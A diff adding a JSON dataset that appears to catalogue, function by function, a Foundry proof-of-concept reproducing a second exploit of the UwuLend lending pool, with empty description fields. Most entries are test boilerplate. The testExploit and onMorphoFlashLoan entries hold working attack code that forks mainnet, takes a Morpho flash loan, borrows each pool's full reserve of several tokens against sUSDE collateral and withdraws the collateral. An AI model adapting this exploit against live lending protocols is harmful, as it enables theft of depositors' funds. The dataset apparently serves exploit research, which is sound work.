@@ -1,0 +1,100 @@
+[
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "onMorphoFlashLoan",
+    "original_code": "    function onMorphoFlashLoan(uint256 amounts, bytes calldata) external {\n        WETH.approve(address(msg.sender), type(uint256).max);\n\n        WETH.approve(address(uwuLendPool), type(uint256).max);\n\n        // Deposit WETH to uwuLendPool as collateral\n        uwuLendPool.deposit(address(WETH), amounts, address(this), 0);\n\n        // Borrow asset with WETH as collateral\n        uwuLendPool.borrow(address(WETH), WETH.balanceOf(address(uWETH)) - amounts, 2, 0, address(this));\n\n        uwuLendPool.borrow(address(CRV), CRV.balanceOf(address(uCRV)), 2, 0, address(this));\n\n        uwuLendPool.borrow(address(crvUSD), crvUSD.balanceOf(address(ucrvUSD)), 2, 0, address(this));\n\n        uwuLendPool.borrow(address(DAI), DAI.balanceOf(address(uDAI)), 2, 0, address(this));\n\n        uwuLendPool.borrow(address(USDT), USDT.balanceOf(address(uUSDT)), 2, 0, address(this));\n\n        uwuLendPool.borrow(address(FRAX), FRAX.balanceOf(address(uFRAX)), 2, 0, address(this));\n\n        uwuLendPool.borrow(address(LUSD), LUSD.balanceOf(address(uLUSD)), 2, 0, address(this));\n\n        // withdraw WETH collateral with uSUSDE keeping the health factor\n\n        (\n            uint256 totalCollateral,\n            uint256 totalDebt,\n            uint256 availableBorrows,\n            uint256 currentLiquidationThreshold,\n            uint256 ltv,\n            uint256 healthFactor\n        ) = uwuLendPool.getUserAccountData(address(this));\n        console.log(\"\\n  before withdraw\");\n        emit log_named_decimal_uint(\"totalCollateral\", totalCollateral, 8);\n        emit log_named_decimal_uint(\"totalDebt\", totalDebt, 8);\n        emit log_named_decimal_uint(\"availableBorrows\", availableBorrows, 8);\n        emit log_named_decimal_uint(\"currentLiquidationThreshold\", currentLiquidationThreshold, 8);\n        emit log_named_decimal_uint(\"ltv\", ltv, 4);\n        emit log_named_decimal_uint(\"healthFactor\", healthFactor, 18);\n\n        uwuLendPool.withdraw(address(WETH), type(uint256).max, address(this));\n\n        (totalCollateral, totalDebt, availableBorrows, currentLiquidationThreshold, ltv, healthFactor) =\n            uwuLendPool.getUserAccountData(address(this));\n        console.log(\"\\n  after withdraw\");\n        emit log_named_decimal_uint(\"totalCollateral\", totalCollateral, 8);\n        emit log_named_decimal_uint(\"totalDebt\", totalDebt, 8);\n        emit log_named_decimal_uint(\"availableBorrows\", availableBorrows, 8);\n        emit log_named_decimal_uint(\"currentLiquidationThreshold\", currentLiquidationThreshold, 8);\n        emit log_named_decimal_uint(\"ltv\", ltv, 4);\n        emit log_named_decimal_uint(\"healthFactor\", healthFactor, 18);\n\n        emit log_named_decimal_uint(\"\\n  attacker CRV token balance\", CRV.balanceOf(address(this)), CRV.decimals());\n        emit log_named_decimal_uint(\"attacker crvUSD token balance\", crvUSD.balanceOf(address(this)), crvUSD.decimals());\n        emit log_named_decimal_uint(\"attacker DAI token balance\", DAI.balanceOf(address(this)), DAI.decimals());\n        emit log_named_decimal_uint(\"attacker USDT token balance\", USDT.balanceOf(address(this)), USDT.decimals());\n        emit log_named_decimal_uint(\"attacker FRAX token balance\", FRAX.balanceOf(address(this)), FRAX.decimals());\n        emit log_named_decimal_uint(\"attacker LUSD token balance\", LUSD.balanceOf(address(this)), LUSD.decimals());\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 20_081_503);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(uSUSDE), \"uSUSDE\");\n        vm.label(address(uWETH), \"uWETH\");\n        vm.label(address(uwuLendPool), \"uwuLendPool\");\n        vm.label(address(morphoBlueFlashLoan), \"morphoBlueFlashLoan\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UwuLend_Second_exp",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        vm.startPrank(attacker);\n        uSUSDE.transfer(address(this), 60_000_000 ether);\n        vm.stopPrank();\n\n        (\n            uint256 totalCollateral,\n            uint256 totalDebt,\n            uint256 availableBorrows,\n            uint256 currentLiquidationThreshold,\n            uint256 ltv,\n            uint256 healthFactor\n        ) = uwuLendPool.getUserAccountData(address(this));\n        console.log(\"\\n  sUSDE position\");\n        emit log_named_decimal_uint(\"totalCollateral\", totalCollateral, 8);\n        emit log_named_decimal_uint(\"totalDebt\", totalDebt, 8);\n        emit log_named_decimal_uint(\"availableBorrows\", availableBorrows, 8);\n        emit log_named_decimal_uint(\"currentLiquidationThreshold\", currentLiquidationThreshold, 8);\n        emit log_named_decimal_uint(\"ltv\", ltv, 4);\n        emit log_named_decimal_uint(\"healthFactor\", healthFactor, 18);\n\n        morphoBlueFlashLoan.flashLoan(address(WETH), WETH.balanceOf(address(morphoBlueFlashLoan)), new bytes(0));\n    }\n\n",
+    "description": ""
+  }
+]
